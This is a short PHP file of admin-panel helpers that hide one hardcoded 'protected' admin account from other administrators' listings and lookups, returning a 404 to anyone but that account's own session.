<?php

const PROTECTED_ADMIN_EMAIL = '49rickyai@gmail.com';

function protected_admin_user_id(mysqli $conn): int
{
    static $id = null;
    if ($id !== null) return $id;

    $email = mysqli_real_escape_string($conn, PROTECTED_ADMIN_EMAIL);
    $result = mysqli_query($conn, "SELECT id FROM user_data WHERE email='$email' LIMIT 1");
    $row = $result ? mysqli_fetch_assoc($result) : null;
    $id = (int)($row['id'] ?? 0);
    return $id;
}

function current_admin_user_id(mysqli $conn): int
{
    if (empty($_SESSION['token'])) return 0;

    $token = mysqli_real_escape_string($conn, $_SESSION['token']);
    $result = mysqli_query($conn, "SELECT user_id FROM login_token WHERE token='$token' AND status='1' LIMIT 1");
    $row = $result ? mysqli_fetch_assoc($result) : null;
    return (int)($row['user_id'] ?? 0);
}

function can_view_protected_admin(mysqli $conn): bool
{
    $protected_id = protected_admin_user_id($conn);
    return $protected_id > 0 && current_admin_user_id($conn) === $protected_id;
}

function admin_user_visibility_sql(mysqli $conn, string $user_column): string
{
    $protected_id = protected_admin_user_id($conn);
    if ($protected_id === 0 || can_view_protected_admin($conn)) return '1=1';
    return $user_column . ' <> ' . $protected_id;
}

function deny_protected_user_access(mysqli $conn, int $user_id): void
{
    if ($user_id === protected_admin_user_id($conn) && !can_view_protected_admin($conn)) {
        http_response_code(404);
        exit('User not found.');
    }
}
